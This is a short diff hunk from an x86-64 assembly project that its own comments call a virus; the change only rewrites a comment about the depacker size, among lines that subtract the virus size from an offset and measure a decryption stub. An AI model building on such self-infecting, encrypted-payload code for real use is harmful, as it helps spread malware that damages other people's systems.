@@ -214,7 +214,7 @@ _loop_verif:
 	mov r10, QWORD [rsp + 8] ; take the virus size
 	sub QWORD [rsp + 56], r10 ; substract the virus size to our offset+size
 
-; take depacekr size
+; take depacker size + key_size
 	lea r10, [rel _decrypt]
 	lea r11, [rel _end_decrypt]
 	add r11, 2
